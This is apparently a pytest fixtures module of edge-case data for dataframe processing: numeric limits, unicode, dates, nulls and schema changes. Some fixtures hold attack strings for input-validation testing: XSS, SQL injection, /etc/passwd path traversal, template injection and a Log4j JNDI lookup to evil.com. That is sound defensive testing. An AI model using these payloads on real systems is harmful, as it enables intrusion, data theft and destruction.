"""Edge case and boundary condition fixtures for comprehensive testing.

This module provides fixtures that test boundary conditions, limit cases,
and edge scenarios that are crucial for robust data processing systems.
"""

import pytest
import sys
import math
from datetime import datetime, date, timedelta, timezone
from decimal import Decimal, getcontext
import uuid
from typing import Dict, List, Any, Optional
import polars as pl
import pandas as pd
import pyarrow as pa


@pytest.fixture(scope="session")
def numeric_boundary_data():
    """Test data with numeric boundary values and precision edge cases."""
    # Set high precision for Decimal operations
    getcontext().prec = 50
    
    return {
        "integers": [
            # Standard boundaries
            0, 1, -1,
            # Integer limits
            sys.maxsize, -sys.maxsize - 1,
            # Common boundaries
            2**31 - 1, -2**31,  # 32-bit signed int limits
            2**63 - 1, -2**63,  # 64-bit signed int limits
            # Small boundaries
            127, -128,  # 8-bit signed
            255, 0,     # 8-bit unsigned
            32767, -32768,  # 16-bit signed
        ],
        
        "floats": [
            # Zero variations
            0.0, -0.0,
            # Small numbers
            sys.float_info.min, -sys.float_info.min,
            sys.float_info.epsilon, -sys.float_info.epsilon,
            # Large numbers
            sys.float_info.max, -sys.float_info.max,
            # Special values
            float('inf'), float('-inf'), float('nan'),
            # Precision boundaries
            1e-15, 1e-16, 1e-17,  # Near floating point precision limits
            1e15, 1e16, 1e17,     # Large but representable
            # Subnormal numbers
            5e-324,  # Smallest positive subnormal
            1.7976931348623157e+308,  # Largest representable
        ],
        
        "decimals": [
            Decimal('0'),
            Decimal('0.1'),
            Decimal('0.01'),
            Decimal('0.001'),
            Decimal('0.0001'),
            # Large precise numbers
            Decimal('999999999999999999.999999999999999999'),
            Decimal('-999999999999999999.999999999999999999'),
            # Financial precision
            Decimal('123456789.12'),
            Decimal('0.123456789123456789'),
            # Edge cases for rounding
            Decimal('0.5'),
            Decimal('1.5'),
            Decimal('2.5'),
            # Very small numbers
            Decimal('1E-28'),
            Decimal('1E-50'),
        ]
    }


@pytest.fixture(scope="session")
def string_boundary_data():
    """Test data with string boundary conditions and edge cases."""
    return {
        "empty_and_whitespace": [
            "",           # Empty string
            " ",          # Single space
            "  ",         # Multiple spaces
            "\\t",        # Tab character
            "\\n",        # Newline
            "\\r\\n",     # Windows line ending
            "   \\n\\t  ", # Mixed whitespace
        ],
        
        "length_boundaries": [
            "a",          # Single character
            "a" * 255,    # Common varchar limit
            "a" * 256,    # Just over varchar limit
            "a" * 1000,   # Medium string
            "a" * 65535,  # TEXT field limit
            "a" * 1000000,  # Very long string
        ],
        
        "unicode_edge_cases": [
            "Hello, 世界",  # Mixed ASCII and Unicode
            "🚀🌟✨",       # Emoji
            "Café naïve résumé",  # Accented characters
            "Москва",       # Cyrillic
            "العربية",       # Arabic (RTL)
            "🏳️‍🌈🏳️‍⚧️",      # Complex emoji with ZWJ sequences
            "\\u0000",      # Null character
            "\\u001F",      # Control character
            "\\uFFFE",      # Non-character
            "\\U0001F600",  # 4-byte UTF-8 emoji
        ],
        
        "special_characters": [
            "\\\"'`",       # Quote characters
            "\\\\",         # Backslash
            "<script>",     # HTML/XSS
            "${variable}",  # Template syntax
            "../../../",   # Path traversal
            "SELECT * FROM", # SQL injection
            "\\x00\\x01\\x02", # Binary data as string
            "🔥💻⚡",        # Technical emojis
        ],
        
        "json_and_structured": [
            '{"key": "value"}',  # Valid JSON
            '{"incomplete": ',   # Invalid JSON
            '[1, 2, 3]',        # JSON array
            'null',             # JSON null
            '"string"',         # JSON string
            '{"nested": {"deep": true}}',  # Nested JSON
            '{"unicode": "🚀"}', # Unicode in JSON
        ]
    }


@pytest.fixture(scope="session") 
def datetime_boundary_data():
    """Test data with date/time boundary conditions and edge cases."""
    return {
        "historical_dates": [
            date(1, 1, 1),        # Minimum date
            date(1900, 1, 1),     # Y1900 boundary
            date(1970, 1, 1),     # Unix epoch
            date(1999, 12, 31),   # Y2K boundary
            date(2000, 1, 1),     # Y2K
            date(2000, 2, 29),    # Leap day in Y2K
        ],
        
        "future_dates": [
            date(2038, 1, 19),    # Unix 32-bit timestamp limit
            date(2100, 2, 28),    # Non-leap year (divisible by 100)
            date(2400, 2, 29),    # Leap year (divisible by 400)
            date(9999, 12, 31),   # Maximum date
        ],
        
        "leap_year_scenarios": [
            date(2000, 2, 29),    # Leap day (div by 400)
            date(2004, 2, 29),    # Regular leap year
            date(1900, 2, 28),    # Non-leap (div by 100 but not 400)
            date(2100, 2, 28),    # Future non-leap century
        ],
        
        "datetimes_with_timezone": [
            datetime(1970, 1, 1, 0, 0, 0, tzinfo=timezone.utc),  # Unix epoch UTC
            datetime(2038, 1, 19, 3, 14, 7, tzinfo=timezone.utc),  # 32-bit limit
            datetime(2000, 1, 1, 0, 0, 0, tzinfo=timezone(timedelta(hours=14))),  # UTC+14
            datetime(2000, 1, 1, 0, 0, 0, tzinfo=timezone(timedelta(hours=-12))),  # UTC-12
            datetime(2024, 3, 10, 2, 30, 0),  # During DST transition (ambiguous)
            datetime(2024, 11, 3, 1, 30, 0),  # During DST fallback (non-existent)
        ],
        
        "time_precision": [
            datetime(2024, 1, 1, 0, 0, 0, 0),        # No microseconds
            datetime(2024, 1, 1, 0, 0, 0, 1),        # 1 microsecond
            datetime(2024, 1, 1, 0, 0, 0, 999999),   # Max microseconds
            datetime(2024, 1, 1, 23, 59, 59, 999999), # End of day
        ],
        
        "duration_edge_cases": [
            timedelta(0),                    # Zero duration
            timedelta(microseconds=1),       # Minimum duration
            timedelta(days=999999999),       # Maximum duration
            timedelta(days=-999999999),      # Minimum negative duration
            timedelta(weeks=52),             # One year
            timedelta(hours=24),             # One day
            timedelta(seconds=86400),        # One day in seconds
        ]
    }


@pytest.fixture(scope="session")
def null_and_missing_data():
    """Test data with various null, missing, and undefined value scenarios."""
    return {
        "explicit_nulls": [None, None, None, None, None],
        
        "mixed_with_nulls": [
            1, None, 3, None, 5, None, 7, None, 9, None
        ],
        
        "empty_equivalents": [
            "", None, "   ", "NULL", "null", "None", "N/A", "n/a", 
            "NA", "unknown", "undefined", "-", "?"
        ],
        
        "numeric_nulls": [
            0, None, float('nan'), -1, 999999999, None, 
            float('inf'), float('-inf')
        ],
        
        "string_nulls": [
            None, "", " ", "NULL", "null", "<null>", "\\N", 
            "missing", "unknown", "n/a"
        ],
        
        "date_nulls": [
            None, date(1900, 1, 1), date(1970, 1, 1), 
            None, date(9999, 12, 31)
        ],
        
        # Arrays with different null patterns
        "sparse_data": [1, None, None, None, 5, None, None, None, None, 10],
        "mostly_null": [None] * 95 + [1, 2, 3, 4, 5],
        "alternating_null": [i if i % 2 == 0 else None for i in range(20)],
    }


@pytest.fixture(scope="session")
def data_type_coercion_scenarios():
    """Test data for validating type coercion and conversion edge cases."""
    return {
        "numeric_strings": [
            "123", "123.45", "-123", "-123.45", "0", "0.0",
            " 123 ", "123.", ".123", "1e5", "1E-5", 
            "+123", "∞", "-∞", "NaN"
        ],
        
        "boolean_variations": [
            True, False, 1, 0, "true", "false", "True", "False", 
            "TRUE", "FALSE", "yes", "no", "y", "n", "1", "0",
            None, "", "maybe"
        ],
        
        "date_string_formats": [
            "2024-01-15",           # ISO format
            "01/15/2024",          # US format  
            "15/01/2024",          # European format
            "15-Jan-2024",         # Named month
            "January 15, 2024",    # Long format
            "2024-01-15T10:30:00Z", # ISO with time
            "1642248600",          # Unix timestamp
            "invalid_date",        # Invalid
            "",                    # Empty
            None                   # Null
        ],
        
        "mixed_types_column": [
            1, "2", 3.0, "4.5", True, False, None, 
            "string", [1, 2, 3], {"key": "value"}
        ],
        
        "precision_loss_scenarios": [
            # Numbers that lose precision in float conversion
            9007199254740992,     # 2^53, last integer representable in double
            9007199254740993,     # 2^53 + 1, not representable
            0.1 + 0.2,            # Classic floating point precision issue
            Decimal('0.1'),       # High precision decimal
            Decimal('1') / Decimal('3'),  # Repeating decimal
        ]
    }


@pytest.fixture(scope="session")
def memory_stress_boundaries():
    """Test data designed to stress memory boundaries and performance limits."""
    
    def create_large_strings():
        """Create strings of various problematic sizes."""
        return {
            "small_strings": ["x" * i for i in [0, 1, 10, 100]],
            "medium_strings": ["y" * i for i in [1000, 10000]],
            # Note: Very large strings commented out to avoid memory issues in tests
            # "large_strings": ["z" * i for i in [100000, 1000000]],
        }
    
    def create_wide_data():
        """Create data with many columns (wide format)."""
        return {f"col_{i:04d}": [i, i+1, i+2] for i in range(500)}
    
    def create_tall_data():
        """Create data with many rows (tall format).""" 
        return {
            "id": list(range(10000)),
            "value": [i * 0.1 for i in range(10000)],
            "category": [f"cat_{i % 100}" for i in range(10000)]
        }
    
    return {
        "string_boundaries": create_large_strings(),
        "wide_format": create_wide_data(),
        "tall_format": create_tall_data(),
        
        "nested_structures": {
            "simple_list": [list(range(100)) for _ in range(100)],
            "nested_dicts": [{"level1": {"level2": {"level3": i}}} for i in range(100)],
            "mixed_nesting": [
                {"list": [1, 2, 3], "dict": {"nested": True}, "simple": i}
                for i in range(50)
            ]
        },
        
        "repetitive_data": {
            "high_cardinality": [f"unique_value_{i}" for i in range(10000)],
            "low_cardinality": ["repeated_value"] * 10000,
            "medium_cardinality": [f"category_{i % 100}" for i in range(10000)]
        }
    }


@pytest.fixture(scope="session")
def schema_evolution_data():
    """Test data for schema evolution and compatibility scenarios."""
    return {
        "version_1_schema": {
            "id": [1, 2, 3],
            "name": ["Alice", "Bob", "Charlie"],
            "value": [100.5, 200.7, 300.9]
        },
        
        "version_2_schema": {  # Added column
            "id": [4, 5, 6],
            "name": ["Diana", "Eve", "Frank"],
            "value": [400.2, 500.8, 600.1],
            "category": ["A", "B", "C"]  # New column
        },
        
        "version_3_schema": {  # Type change
            "id": [7, 8, 9],
            "name": ["Grace", "Henry", "Iris"],
            "value": ["700.3", "800.4", "900.5"],  # Changed from float to string
            "category": ["D", "E", "F"],
            "active": [True, False, True]  # Another new column
        },
        
        "version_4_schema": {  # Column renamed
            "identifier": [10, 11, 12],  # Renamed from "id"
            "full_name": ["Jack", "Karen", "Leo"],  # Renamed from "name" 
            "amount": [1000.6, 1100.7, 1200.8],  # Renamed from "value", back to float
            "category": ["G", "H", "I"],
            "is_active": [False, True, False]  # Renamed from "active"
        },
        
        "missing_columns": {  # Some columns missing
            "identifier": [13, 14, 15],
            "full_name": ["Mike", "Nina", "Oscar"]
            # Missing: amount, category, is_active
        },
        
        "extra_columns": {  # Extra unexpected columns
            "identifier": [16, 17, 18],
            "full_name": ["Paul", "Quinn", "Rachel"],
            "amount": [1300.9, 1400.1, 1500.2],
            "category": ["J", "K", "L"],
            "is_active": [True, True, False],
            "unexpected_column": ["surprise", "data", "here"],
            "another_extra": [1, 2, 3]
        }
    }


@pytest.fixture(scope="session")
def encoding_and_character_edge_cases():
    """Test data with various character encodings and problematic text."""
    return {
        "utf8_sequences": [
            "Hello World",                    # ASCII
            "Café naïve",                    # Latin-1 supplement
            "日本語",                         # CJK ideographs
            "🚀🌟✨💫",                      # Emoji
            "𝕏 𝔸ℝ𝔼 𝕞𝕒𝕥𝕙",                  # Mathematical symbols
            "\\u200B\\u200C\\u200D",         # Zero-width characters
            "\\uFEFF",                       # Byte order mark
        ],
        
        "problematic_sequences": [
            "\\x00\\x01\\x02",               # Control characters
            "\\u0008\\u0009\\u000A",         # Backspace, tab, newline
            "\\uD800\\uDC00",               # Surrogate pair
            "\\uFFFE\\uFFFF",               # Non-characters
            "\\U0001F4A9",                   # Pile of poo emoji (4-byte UTF-8)
        ],
        
        "normalization_issues": [
            "café",                          # NFC normalized
            "cafe\\u0301",                   # NFD normalized (e + combining accent)
            "\\u00E9",                       # Single é character
            "e\\u0301",                      # e + combining acute accent
        ],
        
        "mixed_encodings": [
            # These would represent different encodings of the same text
            "café".encode('utf-8').decode('latin-1', errors='ignore'),
            "café".encode('utf-8').decode('ascii', errors='ignore'),
        ],
        
        "injection_attempts": [
            "<script>alert('xss')</script>",  # XSS
            "'; DROP TABLE users; --",       # SQL injection
            "../../../etc/passwd",           # Path traversal
            "${jndi:ldap://evil.com/a}",     # Log4j injection
            "{{7*7}}",                       # Template injection
        ]
    }


@pytest.fixture(scope="session")
def concurrent_access_scenarios():
    """Test data for concurrent access and race condition scenarios."""
    # Simulate data that might be modified concurrently
    base_timestamp = datetime.now(timezone.utc)
    
    return {
        "version_conflicts": [
            {
                "id": 1,
                "value": "original",
                "version": 1,
                "updated_at": base_timestamp,
                "updated_by": "user_a"
            },
            {
                "id": 1,
                "value": "modified_by_user_a", 
                "version": 2,
                "updated_at": base_timestamp + timedelta(seconds=1),
                "updated_by": "user_a"
            },
            {
                "id": 1,
                "value": "modified_by_user_b",
                "version": 2,  # Same version - conflict!
                "updated_at": base_timestamp + timedelta(seconds=2),
                "updated_by": "user_b"
            }
        ],
        
        "rapid_updates": [
            {
                "id": i,
                "timestamp": base_timestamp + timedelta(microseconds=i*100),
                "counter": i,
                "session": f"session_{i % 3}"  # 3 concurrent sessions
            }
            for i in range(1000)
        ],
        
        "deadlock_scenario": {
            "resource_a": [
                {"id": 1, "locked_by": "session_1", "locked_at": base_timestamp},
                {"id": 2, "locked_by": "session_2", "locked_at": base_timestamp + timedelta(seconds=1)}
            ],
            "resource_b": [
                {"id": 1, "locked_by": "session_2", "locked_at": base_timestamp + timedelta(seconds=2)},
                {"id": 2, "locked_by": "session_1", "locked_at": base_timestamp + timedelta(seconds=3)}
            ]
        }
    }


# DataFrame-specific edge case fixtures
@pytest.fixture
def edge_case_dataframes():
    """Factory for creating DataFrames with edge case data."""
    
    def create_boundary_df(framework: str = "polars", scenario: str = "numeric_boundaries"):
        """Create a DataFrame with boundary conditions for specified framework."""
        
        if scenario == "numeric_boundaries":
            data = {
                "int_col": [0, 1, -1, sys.maxsize, -sys.maxsize-1],
                "float_col": [0.0, sys.float_info.min, sys.float_info.max, float('inf'), float('nan')],
                "decimal_col": [Decimal('0'), Decimal('0.1'), Decimal('999999999.99'), Decimal('1E-10'), None]
            }
        elif scenario == "string_boundaries":
            data = {
                "empty_strings": ["", " ", None, "\\t", "\\n"],
                "long_strings": ["a", "a"*100, "a"*1000, "a"*10000, None],
                "unicode_strings": ["Hello", "世界", "🚀", "Café", None]
            }
        elif scenario == "datetime_boundaries":
            data = {
                "dates": [
                    date(1970, 1, 1), date(2000, 2, 29), date(2038, 1, 19), 
                    date(9999, 12, 31), None
                ],
                "datetimes": [
                    datetime(1970, 1, 1, tzinfo=timezone.utc),
                    datetime(2038, 1, 19, 3, 14, 7, tzinfo=timezone.utc),
                    datetime(2000, 1, 1, tzinfo=timezone(timedelta(hours=14))),
                    datetime.now(timezone.utc),
                    None
                ]
            }
        else:
            raise ValueError(f"Unknown scenario: {scenario}")
        
        if framework == "polars":
            return pl.DataFrame(data)
        elif framework == "pandas":
            return pd.DataFrame(data)
        elif framework == "pyarrow":
            return pa.table(data)
        else:
            raise ValueError(f"Unknown framework: {framework}")
    
    return create_boundary_df


@pytest.fixture
def problematic_data_scenarios():
    """Specific problematic data scenarios that have caused issues in production."""
    return {
        "floating_point_precision": {
            "description": "Floating point arithmetic precision issues",
            "data": {
                "calculation": [0.1 + 0.2, 0.3],
                "expected": [0.3, 0.3],
                "equal": [0.1 + 0.2 == 0.3, True]  # Should be [False, True]
            }
        },
        
        "timezone_ambiguity": {
            "description": "Ambiguous datetime during DST transitions",
            "data": {
                "timestamp": [
                    "2024-03-10 02:30:00",  # Spring forward - doesn't exist
                    "2024-11-03 01:30:00",  # Fall back - exists twice
                ],
                "timezone": ["US/Eastern", "US/Eastern"],
                "is_ambiguous": [True, True]
            }
        },
        
        "json_parsing_edge_cases": {
            "description": "JSON strings that cause parsing issues",
            "data": {
                "json_string": [
                    '{"key": "value"}',      # Valid
                    '{"incomplete": ',       # Invalid - truncated
                    '{"nested": {"very": {"deep": "object"}}}',  # Deeply nested
                    '{"number": 999999999999999999999}',  # Number too large
                    '{"unicode": "🚀💻"}',   # Unicode in JSON
                    '{"null": null, "empty": ""}',  # Mixed null/empty
                ]
            }
        },
        
        "sql_injection_data": {
            "description": "Data that looks like SQL injection attempts",
            "data": {
                "user_input": [
                    "normal_user",
                    "'; DROP TABLE users; --",
                    "admin' OR '1'='1",
                    "user\\x00admin",
                    "UNION SELECT password FROM users",
                ]
            }
        }
    }